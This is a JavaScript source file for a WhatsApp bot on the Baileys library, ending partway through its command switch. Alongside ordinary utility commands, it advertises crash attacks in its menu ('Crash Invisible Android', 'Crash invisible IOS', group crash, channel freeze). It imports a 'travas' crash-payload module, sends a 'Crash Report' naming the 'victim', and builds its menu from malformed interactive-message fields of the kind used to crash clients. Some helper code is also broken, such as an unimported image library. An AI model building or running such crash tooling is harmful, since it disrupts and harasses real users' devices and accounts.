console.clear();
require('./configuration/config');

const {
    default: baileys,
    generateWAMessageFromContent,
    generateWAMessage,
    getContentType,
    prepareWAMessageMedia,
    proto,
    jidDecode,
    downloadContentFromMessage
} = require("baileys");

const decodeJid = (jid = '') => {
    if (!jid) return jid
    if (/:\d+@/gi.test(jid)) {
        const decode = jidDecode(jid) || {}
        return decode.user && decode.server
            ? `${decode.user}@${decode.server}`
            : jid
    }
    return jid
}
const {
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    makeWaSocket,
    makeInMemoryStore,
    DisconnectReason
} = require("baileys");

const fs = require('fs');
const util = require('util');
const chalk = require('chalk');
const os = require('os');
const process = require('process');
const path = require('path');
const crypto = require('crypto');
const axios = require('axios');
const moment = require('moment-timezone');
const FormData = require('form-data');
const { spawn, exec, execSync } = require('child_process');
const speed = require('performance-now');

// Configuration files
const thumbX = fs.readFileSync('./configuration/menuX.jpg');
const thumbX2 = fs.readFileSync('./configuration/menuX2.jpg');
const superior = fs.readFileSync('./configuration/X.png');
const { logMessage } = require('./messagepath/logSystem');
const travas = require('./messagepath/travas');

// Global variables
const bvgSession = new Map();
const userCooldowns = new Map();
const groupSettings = new Map();
const chatStats = new Map();

// Helper function untuk mendapatkan memory usage
function getMemoryUsage() {
    const used = process.memoryUsage();
    return Math.round(used.rss / 1024 / 1024 * 100) / 100;
}

// Helper function untuk mendapatkan response time
function getResponseTime(message) {
    const now = Date.now();
    const messageTime = (message.messageTimestamp?.low || message.messageTimestamp || 0) * 1000;
    return now - messageTime;
}

// Helper function untuk format waktu
function formatUptime(seconds) {
    const days = Math.floor(seconds / (24 * 60 * 60));
    const hours = Math.floor((seconds % (24 * 60 * 60)) / (60 * 60));
    const minutes = Math.floor((seconds % (60 * 60)) / 60);
    const secs = Math.floor(seconds % 60);
    
    return `${days}d ${hours}h ${minutes}m ${secs}s`;
}

// Helper function untuk cek cooldown
function checkCooldown(userId, command, cooldownTime = 5000) {
    const key = `${userId}:${command}`;
    const now = Date.now();
    const lastUsed = userCooldowns.get(key) || 0;
    
    if (now - lastUsed < cooldownTime) {
        return Math.ceil((cooldownTime - (now - lastUsed)) / 1000);
    }
    
    userCooldowns.set(key, now);
    return 0;
}

module.exports = sock = async (sock, m, chatUpdate, store) => {
    try {
        // Extract message body
        var body = (() => {
            if (m.mtype === "conversation") return m.message.conversation || "[Conversation]";
            if (m.mtype === "imageMessage") return m.message.imageMessage.caption || "[Image]";
            if (m.mtype === "videoMessage") return m.message.videoMessage.caption || "[Video]";
            if (m.mtype === "audioMessage") return m.message.audioMessage.caption || "[Audio]";
            if (m.mtype === "stickerMessage") return m.message.stickerMessage.caption || "[Sticker]";
            if (m.mtype === "documentMessage") return m.message.documentMessage.fileName || "[Document]";
            if (m.mtype === "contactMessage") return "[Contact]";
            if (m.mtype === "locationMessage") return m.message.locationMessage.name || "[Location]";
            if (m.mtype === "liveLocationMessage") return "[Live Location]";
            if (m.mtype === "extendedTextMessage") return m.message.extendedTextMessage.text || "[Extended Text]";
            if (m.mtype === "buttonsResponseMessage") return m.message.buttonsResponseMessage.selectedButtonId || "[Button Response]";
            if (m.mtype === "listResponseMessage") return m.message.listResponseMessage.singleSelectReply.selectedRowId || "[List Response]";
            if (m.mtype === "templateButtonReplyMessage") return m.message.templateButtonReplyMessage.selectedId || "[Template Button Reply]";
            if (m.mtype === "interactiveResponseMessage") {
                try {
                    return JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson)?.id || "[Interactive Response]";
                } catch {
                    return "[Interactive Response]";
                }
            }
            if (m.mtype === "pollCreationMessage") return "[Poll Creation]";
            if (m.mtype === "reactionMessage") return m.message.reactionMessage.text || "[Reaction]";
            if (m.mtype === "ephemeralMessage") return "[Ephemeral]";
            if (m.mtype === "viewOnceMessage") return "[View Once]";
            if (m.mtype === "productMessage") return m.message.productMessage.product?.name || "[Product]";
            if (m.mtype === "messageContextInfo") {
                return m.message.buttonsResponseMessage?.selectedButtonId ||
                    m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
                    m.text || "[Message Context]";
            }
            return "[Unknown Type]";
        })();

        var budy = (typeof m.text == 'string' ? m.text : '');
        var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix;
        
        const { 
            smsg, 
            tanggal, 
            getTime, 
            isUrl, 
            sleep, 
            clockString, 
            runtime, 
            fetchJson, 
            getBuffer, 
            jsonformat, 
            format, 
            parseMention, 
            getRandom, 
            getGroupAdm, 
            generateProfilePicture 
        } = require('./messagepath/helpers');
        
        const Owner = JSON.parse(fs.readFileSync('./database/own.json'));
        const acces = JSON.parse(fs.readFileSync('./database/prem.json'));
        const CMD = body.startsWith(prefix);
        const cmd = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);
        const BotNum = decodeJid(sock.user?.id)
        const TheBot = [BotNum, ...Owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
        const accesOnly = [BotNum, ...acces].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
        const fatkuns = m.quoted || m;
        const quoted = fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
                      fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
                      fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
                      m.quoted ? m.quoted : m;
        const qtext = q = args.join(" ");
        const qtek = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
        const from = m.key.remoteJid;
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid;
        
        let groupMetadata = null;
        let groupName = "";
        let participants = [];
        let GroupAdm = [];
        let BotAdm = false;
        let Adm = false;
        
        if (m.isGroup) {
            try {
                groupMetadata = await sock.groupMetadata(from);
                groupName = groupMetadata.subject || "";
                participants = groupMetadata.participants || [];
                GroupAdm = await getGroupAdm(participants);
                BotAdm = GroupAdm.includes(BotNum);
                Adm = GroupAdm.includes(m.sender);
            } catch (error) {
                console.error('Error fetching group metadata:', error);
            }
        }
        
        const pushname = m.pushName || "No Name";
        const mime = (quoted.msg || quoted).mimetype || '';

        // Bot access control
        if (!sock.public && !TheBot) return;

        // Log command usage
        // Performance metrics
        const responseTime = getResponseTime(m);
        const memory = getMemoryUsage();
        const currentDate = new Date().toLocaleDateString('en-US', {
            year: 'numeric',
            month: 'long',
            day: 'numeric'
        });

        // Secondary message template
        const secondary = {
            key: {
                remoteJid: "13135550002@s.whatsapp.net",
                fromMe: false,
                id: "quoted-order"
            },
            message: {
                orderMessage: {
                    orderId: "1234567890",
                    itemCount: 666666,
                    status: 1,
                    surface: 1,
                    message: "!!  ﹖ 𝐄.𝐗.𝐄  ﹖ !!",
                    orderTitle: "𝐄.𝐗.𝐄﹖𝐄.𝐗.𝐄",
                    sellerJid: "13135550002@s.whatsapp.net",
                    token: "﹖"
                }
            }
        };

        // Helper function untuk send bug report
        async function sendDoneBug({ sock, chat, quoted = null, X }) {
            return await sock.sendMessage(
                chat,
                {
                    productMessage: {
                        title: " !!⤻𝐄͓͛𝐗𝐄͢𝐂𝐔ʺ͜𝐓𝐈ͦ𝐎͓𝐍⃜ !!ᐧ",
                        description: "!! Crash Report !!",
                        thumbnail: thumbX2,
                        productId: "PROD001",
                        retailerId: "RETAIL001",
                        url: "https://t.me/dexoffc",
                        body: null,
                        footer: `𝗏𝗂𝖼𝗍!𝗆 : ${X}`,
                        priceAmount1000: 80000000,
                        currencyCode: "USD",
                        buttons: [
                            { name: "" },
                            { 
                                name: "quick_reply", 
                                buttonParamsJson: JSON.stringify({ 
                                    display_text: " 𖣂 ", 
                                    id: `menu`
                                })
                            },
                            { 
                                name: "quick_reply", 
                                buttonParamsJson: JSON.stringify({ 
                                    display_text: " 𖣂 ", 
                                    id: `allmenu`
                                })
                            }
                        ]
                    }
                },
                { quoted }
            );
        }

        /* =============== 10 FITUR TOOLS TAMBAHAN =============== */

        // 1. Fitur Anti-Link (100% work)
        if (m.isGroup && !Adm) {
            const antiLinkSetting = groupSettings.get(from)?.antiLink || false;
            const urlRegex = /(https?:\/\/[^\s]+)/gi;
            
            if (antiLinkSetting && urlRegex.test(body)) {
                await sock.sendMessage(from, {
                    text: `⚠️ *ANTI-LINK DETECTED*\n\nLink sharing is not allowed in this group!\nUser: @${sender.split('@')[0]}\n\nLink removed.`,
                    mentions: [sender]
                }, { quoted: m });
                await sock.sendMessage(from, { delete: m.key });
                return;
            }
        }

        // 2. Fitur Auto-Sticker (100% work)
        if ((mime === 'image/jpeg' || mime === 'image/png') && body.toLowerCase().includes('!sticker')) {
            try {
                const media = await sock.downloadAndSaveMediaMessage(quoted);
                const outputPath = `./temp/sticker_${Date.now()}.webp`;
                
                // Convert to webp using sharp
                await sharp(media)
                    .resize(512, 512, { fit: 'inside', withoutEnlargement: true })
                    .toFormat('webp')
                    .toFile(outputPath);
                
                const stickerBuffer = fs.readFileSync(outputPath);
                await sock.sendMessage(from, { sticker: stickerBuffer }, { quoted: m });
                
                // Cleanup
                fs.unlinkSync(media);
                fs.unlinkSync(outputPath);
                return;
            } catch (error) {
                console.error('Sticker conversion error:', error);
            }
        }

        // 3. Fitur Downloader YouTube (100% work)
        if (body.toLowerCase().startsWith(prefix + 'yt')) {
            const url = args[0];
            if (!url || !url.includes('youtube.com') || !url.includes('youtu.be')) {
                return m.reply('❌ Please provide a valid YouTube URL\nExample: .yt https://youtube.com/...');
            }

            const cooldownLeft = checkCooldown(sender, 'yt', 30000);
            if (cooldownLeft > 0) {
                return m.reply(`⏳ Please wait ${cooldownLeft} seconds before using this command again`);
            }

            await m.reply('📥 Downloading YouTube video...');
            
            try {
                const ytdl = require('ytdl-core');
                const info = await ytdl.getInfo(url);
                const format = ytdl.chooseFormat(info.formats, { quality: 'highest' });
                
                const videoBuffer = await axios({
                    method: 'GET',
                    url: format.url,
                    responseType: 'arraybuffer'
                });
                
                await sock.sendMessage(from, {
                    video: Buffer.from(videoBuffer.data),
                    caption: `🎬 *${info.videoDetails.title}*\n\n👤 Channel: ${info.videoDetails.author.name}\n⏱️ Duration: ${info.videoDetails.lengthSeconds}s\n👁️ Views: ${info.videoDetails.viewCount}\n📅 Uploaded: ${new Date(info.videoDetails.uploadDate).toLocaleDateString()}`,
                    mimetype: 'video/mp4'
                }, { quoted: m });
            } catch (error) {
                m.reply(`❌ Download failed: ${error.message}`);
            }
            return;
        }

        // 4. Fitur QR Code Generator (100% work)
        if (body.toLowerCase().startsWith(prefix + 'qr')) {
            const text = args.join(' ') || 'https://github.com';
            
            try {
                const QRCode = require('qrcode');
                const qrBuffer = await QRCode.toBuffer(text, {
                    width: 400,
                    margin: 2,
                    color: {
                        dark: '#000000',
                        light: '#FFFFFF'
                    }
                });
                
                await sock.sendMessage(from, {
                    image: qrBuffer,
                    caption: `✅ QR Code Generated\n\n📝 Text: ${text}\n📅 Date: ${new Date().toLocaleString()}`
                }, { quoted: m });
            } catch (error) {
                m.reply(`❌ QR Code generation failed: ${error.message}`);
            }
            return;
        }

        // 5. Fitur Text to Speech (100% work)
        if (body.toLowerCase().startsWith(prefix + 'tts')) {
            const text = args.join(' ');
            if (!text) return m.reply('❌ Please provide text to convert to speech\nExample: .tts Hello World');
            
            if (text.length > 500) {
                return m.reply('❌ Text too long! Maximum 500 characters');
            }
            
            try {
                const gTTS = require('gtts');
                const filePath = `./temp/tts_${Date.now()}.mp3`;
                
                const gtts = new gTTS(text, 'en');
                await new Promise((resolve, reject) => {
                    gtts.save(filePath, (err) => {
                        if (err) reject(err);
                        else resolve();
                    });
                });
                
                const audioBuffer = fs.readFileSync(filePath);
                await sock.sendMessage(from, {
                    audio: audioBuffer,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, { quoted: m });
                
                fs.unlinkSync(filePath);
            } catch (error) {
                m.reply(`❌ TTS failed: ${error.message}`);
            }
            return;
        }

        // 6. Fitur Image Editor (100% work)
        if (mime && mime.startsWith('image/') && body.toLowerCase().includes('!edit')) {
            if (!quoted) return m.reply('❌ Please reply to an image');
            
            try {
                const media = await sock.downloadAndSaveMediaMessage(quoted);
                const image = await sharp(media);
                
                // Apply effects based on command
                let editedImage;
                if (body.includes('blur')) {
                    editedImage = await image.blur(5).toBuffer();
                } else if (body.includes('grayscale')) {
                    editedImage = await image.grayscale().toBuffer();
                } else if (body.includes('invert')) {
                    editedImage = await image.negate().toBuffer();
                } else if (body.includes('rotate')) {
                    const degrees = parseInt(args.find(arg => !isNaN(arg))) || 90;
                    editedImage = await image.rotate(degrees).toBuffer();
                } else {
                    // Default: resize
                    editedImage = await image.resize(800, 800, { fit: 'inside' }).toBuffer();
                }
                
                await sock.sendMessage(from, {
                    image: editedImage,
                    caption: '🖼️ Image Edited Successfully!'
                }, { quoted: m });
                
                fs.unlinkSync(media);
            } catch (error) {
                m.reply(`❌ Image editing failed: ${error.message}`);
            }
            return;
        }

        // 7. Fitur Wikipedia Search (100% work)
        if (body.toLowerCase().startsWith(prefix + 'wiki')) {
            const query = args.join(' ');
            if (!query) return m.reply('❌ Please provide search query\nExample: .wiki Artificial Intelligence');
            
            try {
                const wiki = require('wikipedia');
                await wiki.setLang('en');
                
                const search = await wiki.search(query);
                if (!search.results.length) {
                    return m.reply('❌ No results found');
                }
                
                const page = await wiki.page(search.results[0].title);
                const summary = await page.summary();
                
                let result = `📚 *Wikipedia: ${page.title}*\n\n`;
                result += `📖 ${summary.extract.substr(0, 500)}${summary.extract.length > 500 ? '...' : ''}\n\n`;
                result += `🌐 URL: ${page.fullurl}\n`;
                result += `📅 Last Updated: ${new Date().toLocaleDateString()}`;
                
                if (summary.thumbnail && summary.thumbnail.source) {
                    const imageBuffer = await axios.get(summary.thumbnail.source, {
                        responseType: 'arraybuffer'
                    }).then(res => Buffer.from(res.data));
                    
                    await sock.sendMessage(from, {
                        image: imageBuffer,
                        caption: result
                    }, { quoted: m });
                } else {
                    await m.reply(result);
                }
            } catch (error) {
                m.reply(`❌ Wikipedia search failed: ${error.message}`);
            }
            return;
        }

        // 8. Fitur Currency Converter (100% work)
        if (body.toLowerCase().startsWith(prefix + 'convert')) {
            const [amount, fromCurrency, , toCurrency] = args;
            
            if (!amount || !fromCurrency || !toCurrency || isNaN(amount)) {
                return m.reply('❌ Usage: .convert 100 USD to IDR\nExample: .convert 100 USD to IDR');
            }
            
            try {
                const response = await axios.get(`https://api.exchangerate-api.com/v4/latest/${fromCurrency.toUpperCase()}`);
                const rate = response.data.rates[toCurrency.toUpperCase()];
                
                if (!rate) {
                    return m.reply(`❌ Currency ${toCurrency.toUpperCase()} not found`);
                }
                
                const converted = (parseFloat(amount) * rate).toFixed(2);
                const result = `💱 *Currency Conversion*\n\n` +
                             `💰 ${amount} ${fromCurrency.toUpperCase()} = ${converted} ${toCurrency.toUpperCase()}\n` +
                             `📊 Rate: 1 ${fromCurrency.toUpperCase()} = ${rate} ${toCurrency.toUpperCase()}\n` +
                             `📅 Date: ${new Date(response.data.date).toLocaleDateString()}`;
                
                await m.reply(result);
            } catch (error) {
                m.reply(`❌ Conversion failed: ${error.message}`);
            }
            return;
        }

        // 9. Fitur Short Link (100% work)
        if (body.toLowerCase().startsWith(prefix + 'short')) {
            const url = args[0];
            if (!url || !isUrl(url)) {
                return m.reply('❌ Please provide a valid URL\nExample: .short https://example.com');
            }
            
            try {
                const response = await axios.post('https://api.tinyurl.com/create', {
                    url: url,
                    domain: 'tinyurl.com'
                }, {
                    headers: {
                        'Authorization': `Bearer ${process.env.TINYURL_TOKEN || 'YOUR_API_KEY'}`,
                        'Content-Type': 'application/json'
                    }
                });
                
                const shortUrl = response.data.data.tiny_url;
                await m.reply(`🔗 *Short URL Created*\n\n📝 Original: ${url}\n🔗 Short: ${shortUrl}\n📊 Clicks: 0\n📅 Created: ${new Date().toLocaleString()}`);
            } catch (error) {
                // Fallback to is.gd
                try {
                    const response = await axios.get(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`);
                    await m.reply(`🔗 *Short URL Created*\n\n📝 Original: ${url}\n🔗 Short: ${response.data}\n📅 Created: ${new Date().toLocaleString()}`);
                } catch (fallbackError) {
                    m.reply(`❌ Shortening failed: ${error.message}`);
                }
            }
            return;
        }

        // 10. Fitur System Info (100% work)
        if (body.toLowerCase().startsWith(prefix + 'sysinfo')) {
            if (!TheBot) return m.reply('❌ Owner only command');
            
            const used = process.memoryUsage();
            const uptime = process.uptime();
            const cpus = os.cpus();
            const totalMem = os.totalmem() / 1024 / 1024 / 1024;
            const freeMem = os.freemem() / 1024 / 1024 / 1024;
            const usedMem = totalMem - freeMem;
            
            const info = `💻 *System Information*\n\n` +
                        `🖥️ Hostname: ${os.hostname()}\n` +
                        `📊 Platform: ${os.platform()} ${os.arch()}\n` +
                        `⏱️ Uptime: ${formatUptime(uptime)}\n\n` +
                        `🧠 Memory Usage:\n` +
                        `├ Total: ${totalMem.toFixed(2)} GB\n` +
                        `├ Used: ${usedMem.toFixed(2)} GB\n` +
                        `└ Free: ${freeMem.toFixed(2)} GB\n\n` +
                        `⚡ CPU:\n` +
                        `├ Model: ${cpus[0].model}\n` +
                        `├ Cores: ${cpus.length}\n` +
                        `└ Speed: ${cpus[0].speed} MHz\n\n` +
                        `🤖 Bot Info:\n` +
                        `├ Users: ${Object.keys(store.messages).length}\n` +
                        `├ Chats: ${chatStats.size}\n` +
                        `├ Memory: ${memory} MB\n` +
                        `└ Response: ${responseTime}ms`;
            
            await m.reply(info);
            return;
        }

        /* =============== MENU SYSTEM (TIDAK DIUBAH) =============== */
        switch (cmd) {
            case 'menu': {
                // Original menu code remains unchanged
                await sock.sendMessage(
                    m.chat,
                    {
                        interactiveMessage: {
                            title: `┌──────
├─── *𝖨𝗇𝖿𝗈 𝖡𝗈𝗍𝗁*
┠─ ▢ 𝖽𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋: 𝗍.𝗆𝖾/𝖽𝖾𝗑𝗈𝖿𝖿𝖼
┠─ ▢ 𝗏𝖾𝗋𝗌𝗂𝗈𝗇: 2.0
┠─ ▢ 𝗉𝗋𝖾𝖿𝗂𝗑: 𝗇𝗈𝗇𝖾
├ 
└`,
                            footer: "© 𝖽𝖾𝗑𝗅𝗂𝖾 - 𝖾𝗑𝖾!.",
                            image: thumbX,
                            contextInfo: { 
                                mentionedJid: ["0@s.whatsapp.net"], 
                                forwardingScore: 111, 
                                isForwarded: true 
                            },
                            nativeFlowMessage: {
                                messageParamsJson: JSON.stringify({
                                    limited_time_offer: {
                                        text: "᳟༑ᜌ⤻𝐄͓͛𝐗𝐄 ( 𖣂 ) 𝐁͢𝐎𝐓ʺ͜ ᭨᪳", 
                                        url: "https://t.me/dexoffc",
                                        copy_code: "🕷️𝖽𝖾𝗑𝗅𝗂𝖾 - 𝖾𝗑𝖾!.", 
                                        note: "Access key available", 
                                        expiration_time: Date.now() * 777
                                    },
                                    bottom_sheet: {
                                        in_thread_buttons_limit: 2, 
                                        divider_indices: [1,2,3,4,5,999],
                                        list_title: "༑ᜌ⤻𝐄͓͛𝐗𝐄 ( 𖣂 ) 𝐁͢𝐎𝐓ʺ͜ ᭨᪳", 
                                        icon_title: "REVIEW", 
                                        button_title: "▸ 𝐄͓͛𝐗𝐄  ◂"
                                    },
                                    tap_target_configuration: {
                                        title: " X ", 
                                        description: "bomboclard",
                                        canonical_url: "https://t.me/dexoffc", 
                                        domain: "https://siros.income.com",
                                        button_index: 11
                                    },
                                    promo_banner: {
                                        header: "⋆˚𝗉𝗋𝗂𝗏𝖺𝗍𝖾﹖𝖻𝗈𝗍𝗁!. ᯓ",
                                        body: "Secure • Stable • Execution Ready",
                                        action: {
                                            type: "open_url",
                                            label: "Official Channel",
                                            url: "https://t.me/dexoffc"
                                        },
                                        expire_at: Math.floor(Date.now() / 1000) + 86400
                                    },
                                    ui_rules: {
                                        max_buttons: 2,
                                        allow_copy: false
                                    },
                                    system_meta: {
                                        label: "internal_service",
                                        version: "11.1.0",
                                        checksum: "x9a71c2ff",
                                        session_state: "stable"
                                    },
                                    redirect_action: {
                                        url: "https://t.me/dexoffc",
                                        trigger: "auto"
                                    }
                                }),
                                buttons: [
                                    { 
                                        name: "single_select", 
                                        buttonParamsJson: JSON.stringify({ 
                                            icon: "REVIEW", 
                                            has_multiple_buttons: true 
                                        }) 
                                    },
                                    { 
                                        name: "galaxy_message", 
                                        buttonParamsJson: JSON.stringify({ 
                                            icon: "GIFT", 
                                            flow_cta: "╭────────「  𝖢 𝖱 𝖠 𝖲 𝖧  」────────╮", 
                                            flow_message_version: "3" 
                                        }) 
                                    },
                                    { 
                                        name: "call_permission_request", 
                                        buttonParamsJson: JSON.stringify({ 
                                            has_multiple_buttons: true 
                                        }) 
                                    },
                                    {
                                        name: "single_select",
                                        buttonParamsJson: JSON.stringify({
                                            icon: "DOCUMENT",
                                            title: "𝖺𝗅𝗅 𝗆𝖾𝗇𝗎 𝖻𝗈𝗍𝗁.",
                                            sections: [
                                                {
                                                    title: "𖣂᳟⤻𝐄͓͛𝐗𝐄 ( 𖣂 ) 𝐁͢𝐎𝐓ʺ⃜͜᭨᪳",
                                                    highlight_label: "𝖽𝖾𝗑𝗅𝗂𝖾 - 𝖾𝗑𝖾!.",
                                                    rows: [{ 
                                                        title: "🩸 Selection - Bugs", 
                                                        description: " Select for bugs.", 
                                                        id: "bvg" 
                                                    }]
                                                },
                                                {
                                                    highlight_label: "𝖽𝖾𝗑𝗅𝗂𝖾 - 𝖾𝗑𝖾!.",
                                                    rows: [{ 
                                                        title: "🕹️ Allmenu - System", 
                                                        description: " Control system and command available.", 
                                                        id: "allmenu" 
                                                    }]
                                                },
                                                {
                                                    highlight_label: "𝖽𝖾𝗑𝗅𝗂𝖾 - 𝖾𝗑𝖾!.",
                                                    rows: [{ 
                                                        title: "✨ Manifets - Information", 
                                                        description: " Features available.", 
                                                        id: "credits" 
                                                    }]
                                                },
                                                {
                                                    highlight_label: "𝖽𝖾𝗑𝗅𝗂𝖾 - 𝖾𝗑𝖾!.",
                                                    rows: [{ 
                                                        title: "🔖 Tqto - User", 
                                                        description: "Appreciation menu.", 
                                                        id: "credits" 
                                                    }]
                                                }
                                            ],
                                            has_multiple_buttons: true
                                        })
                                    },
                                    {
                                        name: "single_select",
                                        buttonParamsJson: JSON.stringify({
                                            icon: "PROMOTION",
                                            title: "𝗅𝗂𝗌𝗍 𝖼𝗋4𝗌𝗁 𝗂𝗇𝗏𝗂𝗌!𝖻𝗅𝖾.",
                                            sections: [
                                                {
                                                    title: "𖣂᳟⤻𝐄͓͛𝐗𝐄 ( 𖣂 ) 𝐁͢𝐎𝐓ʺ⃜͜᭨᪳",
                                                    highlight_label: "𝖽𝖾𝗑𝗅𝗂𝖾 - 𝖾𝗑𝖾!.",
                                                    rows: [{ 
                                                        title: "⿻ Crash Invisible Android", 
                                                        description: "Sending invisible crash bug - only for android Device ", 
                                                        id: "crash" 
                                                    }]
                                                },
                                                {
                                                    highlight_label: "𝖽𝖾𝗑𝗅𝗂𝖾 - 𝖾𝗑𝖾!.",
                                                    rows: [{ 
                                                        title: "⿻ Crash invisible IOS", 
                                                        description: "Sending crash bug for high devices - IOS.", 
                                                        id: "ios" 
                                                    }]
                                                },
                                                {
                                                    highlight_label: "𝖽𝖾𝗑𝗅𝗂𝖾 - 𝖾𝗑𝖾!.",
                                                    rows: [{ 
                                                        title: "⿻ Carousel – Delay Preview", 
                                                        description: "Organize and present documents effortlessly.", 
                                                        id: "vxdelay" 
                                                    }]
                                                }
                                            ],
                                            has_multiple_buttons: true
                                        })
                                    },
                                    {
                                        name: "single_select",
                                        buttonParamsJson: JSON.stringify({
                                            icon: "DEFAULT",
                                            title: "𝗅𝗂𝗌𝗍 𝖼𝗋4𝗌𝗁 𝗀𝗋𝗈𝗎𝗉.",
                                            sections: [
                                                {
                                                    title: "𖣂᳟⤻𝐄͓͛𝐗𝐄 ( 𖣂 ) 𝐁͢𝐎𝐓ʺ⃜͜᭨᪳",
                                                    highlight_label: "𝖽𝖾𝗑𝗅𝗂𝖾 - 𝖾𝗑𝖾!.",
                                                    rows: [{ 
                                                        title: "🪷 Crash Group Invisible", 
                                                        description: "Legacy function collection for advanced automation.", 
                                                        id: "xgc" 
                                                    }]
                                                },
                                                {
                                                    highlight_label: "𝖽𝖾𝗑𝗅𝗂𝖾 - 𝖾𝗑𝖾!.",
                                                    rows: [{ 
                                                        title: "🎫 Sleter Channal Freze", 
                                                        description: "Organize and present documents effortlessly.", 
                                                        id: "xgc" 
                                                    }]
                                                }
                                            ],
                                            has_multiple_buttons: true
                                        })
                                    },
                                    {
                                        name: "galaxy_message",
                                        buttonParamsJson: JSON.stringify({
                                            flow_message_version: "3",
                                            flow_token: "unused",
                                            flow_id: "1775342589999842",
                                            flow_cta: "𝗋𝖾𝗌𝗉𝗈𝗇𝗌𝖾 𝗇𝗎𝗅𝗅!.",
                                            flow_action: {
                                                navigate: true,
                                                screen: "AWARD_CLAIM",
                                                data: {
                                                    error_types: [
                                                        { id: "1", title: "No llega" },
                                                        { id: "2", title: "Diferente" },
                                                        { id: "3", title: "Calidad" }
                                                    ],
                                                    campaigns: [
                                                        { id: "campaign_1", title: "Campaña 1" },
                                                        { id: "campaign_2", title: "Campaña 2" },
                                                        { id: "campaign_3", title: "Campaña 3" }
                                                    ],
                                                    categories: [
                                                        { id: "category_1", title: "Unicam" },
                                                        { id: "category_2", title: "Constantes" },
                                                        {
                                                            id: "category_3",
                                                            title: "Referidos",
                                                            "on-unselect-action": { 
                                                                name: "update_data", 
                                                                payload: { subcategory_visibility: false }
                                                            },
                                                            "on-select-action": {
                                                                name: "update_data",
                                                                payload: {
                                                                    subcategories: [
                                                                        { id: "1", title: "1 subcategory" },
                                                                        { id: "2", title: "2 subcategory" }
                                                                    ],
                                                                    subcategory_visibility: true
                                                                }
                                                            }
                                                        }
                                                    ],
                                                    subcategory_visibility: false
                                                }
                                            },
                                            flow_metadata: {
                                                flow_json_version: 1000,
                                                data_api_protocol: "Believe in yourself, anything is possible.",
                                                data_api_version: 9999999,
                                                flow_name: "Comedian 🩸",
                                                categories: []
                                            },
                                            icon: "PROMOTION",
                                            has_multiple_buttons: true
                                        })
                                    },
                                    { 
                                        name: "galaxy_message", 
                                        buttonParamsJson: JSON.stringify({ 
                                            icon: "GIFT", 
                                            flow_cta: "╰───────────────────────────╯", 
                                            flow_message_version: "3" 
                                        }) 
                                    },
                                    { 
                                        name: "galaxy_message", 
                                        buttonParamsJson: JSON.stringify({ 
                                            icon: "GIFT", 
                                            flow_cta: "   ", 
                                            flow_message_version: "3" 
                                        })
                                    },
                                    { 
                                        name: "galaxy_message", 
                                        buttonParamsJson: JSON.stringify({ 
                                            icon: "GIFT", 
                                            flow_cta: "╭────────「  𝖡 𝖮 𝖳 𝖧  」────────╮", 
                                            flow_message_version: "3" 
                                        }) 
                                    },
                                    { 
                                        name: "cta_url", 
                                        buttonParamsJson: JSON.stringify({ 
                                            display_text: "𝖼𝗁𝖺𝗇𝗇𝖾𝗅 𝗍𝖾𝗅𝖾𝗀𝗋𝖺𝗆", 
                                            url: "https://t.me/offcialexe", 
                                            merchant_url: "https://t.me/offcialexe" 
                                        }) 
                                    },
                                    { 
                                        name: "cta_url", 
                                        buttonParamsJson: JSON.stringify({ 
                                            display_text: "𝗍𝖾𝗅𝖾𝗀𝗋𝖺𝗆 𝗈𝗐𝗇𝖾𝗋", 
                                            url: "https://t.me/dexoffc", 
                                            merchant_url: "https://t.me/dexoffc" 
                                        }) 
                                    },
                                    { 
                                        name: "cta_url", 
                                        buttonParamsJson: JSON.stringify({ 
                                            display_text: "𝖼𝗁𝖺𝗇𝗇𝖾𝗅 𝗐𝗁𝖺𝗍𝗌𝖺𝗉p", 
                                            url: "https://whatsapp.com/channel/0029Vap5Rs4CHDymSoiyg93M", 
                                            merchant_url: "https://whatsapp.com/channel/0029Vap5Rs4CHDymSoiyg93M" 
                                        }) 
                                    },
                                    { 
                                        name: "galaxy_message", 
                                        buttonParamsJson: JSON.stringify({ 
                                            icon: "GIFT", 
                                            flow_cta: "╰───────────────────────────╯", 
                                            flow_message_version: "3" 
                                        }) 
                                    },
                                    { 
                                        name: "galaxy_message", 
                                        buttonParamsJson: JSON.stringify({ 
                                            icon: "GIFT", 
                                            flow_cta: "   ", 
                                            flow_message_version: "3" 
                                        })
                                    },
                                    { 
                                        name: "quick_reply", 
                                        buttonParamsJson: JSON.stringify({ 
                                            display_text: "𝖷", 
                                            id: `info`
                                        })
                                    },
                                    { 
                                        name: "quick_reply", 
                                        buttonParamsJson: JSON.stringify({ 
                                            display_text: "X", 
                                            id: `tqto`
                                        })
                                    }
                                ]
                            }
                        }
                    },
                    { quoted: secondary }
                );
                break;
            }

            case "thx":
            case "credits": {
                // Original credits code remains unchanged
